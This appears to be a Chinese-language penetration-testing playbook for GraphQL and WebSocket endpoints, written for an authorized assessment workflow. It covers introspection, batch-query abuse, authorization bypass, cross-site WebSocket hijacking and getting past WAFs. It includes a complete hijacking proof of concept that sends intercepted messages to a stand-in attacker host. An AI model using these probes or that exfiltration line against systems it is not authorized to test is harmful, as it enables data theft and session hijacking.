---
id: graphql-websocket
title: GraphQL 与 WebSocket 手册（内省/批查询/CSWSH）
tags: graphql,websocket,introspection,cswsh,s4
---
# GraphQL 手册

## 一、端点与内省

```bash
# 端点常见位：/graphql /gql /api/graphql /graphiql（IDE 面）+ GET ?query=
# 内省（泄露 schema → 字段级攻击面地图）：
{"query":"{ __schema { types { name fields { name } } } }"}
# 内省被禁 → 变体：__typename 泄露、建议参数（suggestion）枚举字段名、字段猜测字典（clairvoyance 思路）
```

## 二、业务层缺陷

- **批查询/别名放大**：单请求多别名重复调用敏感查询（配 api-idor 对比）。
- Skip/Take 无上限（资源耗尽面，受控验证一次即停）；嵌套深度循环查询 → 超时差异判据（不开大并发）。
- mutation 未鉴权（鉴权只拦 query）：同一 token 试 mutation 对象级操作。
- **无凭证三态路由（v5.1）**：①客户提供测试账号 → 按上行与字段级越权矩阵全量；②仅匿名 → 内省/建议参数/字段枚举与**匿名 mutation 试调**（内省发现的公开 mutation 无 token 调用判读，写效果 L2）无凭证可做；依赖 token 的单元逐条 record_vt/needs_follow_up 移交（禁止静默跳过）；③无入口 → needs_follow_up 显式登记。禁止自动注册（ROE identity.auto_register）。
- 字段级越权：低权 token 取 admin-only 字段（对象×字段双维矩阵，api-idor 联动）。
- GraphiQL/IDE 未授权暴露（信息泄露级）。

# WebSocket 手册

## 三、连接与消息面

```bash
# origin 未校验（CSWSH）：从测试域页面 new WebSocket("wss://目标/ws") 能建立并收发 = 确证
# 认证传递缺陷：token 只在连接 URL query → 日志/Referer 泄露面
# 消息层：服务端信任客户端发送的 user_id/房间号 → 越权收发判据（订阅他人 id 只收不写）
# 广播回显：消息内容未过滤 → 对端渲染上下文 XSS（xss-context 联动，仅测试账号间）
```

## 四、纪律

- WS 测试全程自建对端（两测试账号互发；账号来自客户提供/索取闭环，无凭据按本文件第二节无凭证三态路由）；禁止向公共频道/真实用户广播。
- 嵌套/批查询类探波单次验证即停，不做压测形态（红线：拒绝服务）。

### WS 握手与工具链

WS 握手指纹：`Upgrade: websocket`+`Connection: Upgrade`+`Sec-WebSocket-Version: 13` → **101 Switching Protocols + Sec-WebSocket-Accept**（Burp/DevTools 按 101+Upgrade 筛端点）。CSWSH 完整 PoC：`const ws=new WebSocket('wss://target/messages');ws.onopen=()=>ws.send('HI');ws.onmessage=(e)=>fetch('https://atk/?'+encodeURIComponent(e.data));`（测试变量：cookie 随握手、subprotocol 要求）。工具链：wsrepl（auth_plugin 复刻 cookie 刷新）、ws-harness（WS→HTTP 桥，桥后接 sqlmap）、SocketSleuth、WebSocket Turbo Intruder。缺陷补两行：消息层无速率限制（滥用面，受控验证）；生产 `ws://` 明文（MITM 面）。修复判据：token 改 Sec-WebSocket-Protocol/首消息认证/cookie+CSRF 三选一。GraphQL 补：内省禁后 `__type(name:"User")` 已知类型探针；端点来源=JS 与移动 bundle 路由提取。**隐藏参数发现清单**：管理文档有公开文档没有的字段；`additionalProperties:true`；前端请求体比 UI 控件丰富；移动端接口带 role/org/feature-flag 内部字段（命中且影响权限→api-idor 路径）。
## v4.8 M6 工具通道兼容性声明

> 口径（loop-core v4.8 纪律 3）：先 probe 后 batch——每个外部工具对目标首次使用前先用小样本探针确认可用性，探针被拦/挂起先切适配通道再批量；探针结果写入交付物工具声明小节。各工具在「挑战型 WAF / 封闭站」下的可用性与适配通道：

- InQL/graphql-cli（introspection 与 schema 枚举）：introspection 流量命中挑战型 WAF 时假阴性——先 probe（单查询 introspection）确认可达；适配通道：channel-snapshot 快照 cookie/UA 复放，或经浏览器通道（mitmproxy↔CDP 上游代理链）带挑战态运行。
- wscat/websocat（WebSocket 握手与 CSWSH 探针）：握手对 Origin 校验类拦截先 probe 单连接；适配通道：自定义 Origin 头复放（-s/-o 快照态）。
- curl：GraphQL POST/WS 升级请求的最小复放工具（channel-snapshot 快照 cookie/UA 复放）；批查询枚举改用 InQL 脚本化，禁用 curl 循环大批量。（v6.4.0 修正：原样板误列 sqlmap——本技能不涉及 SQL 注入通道。）
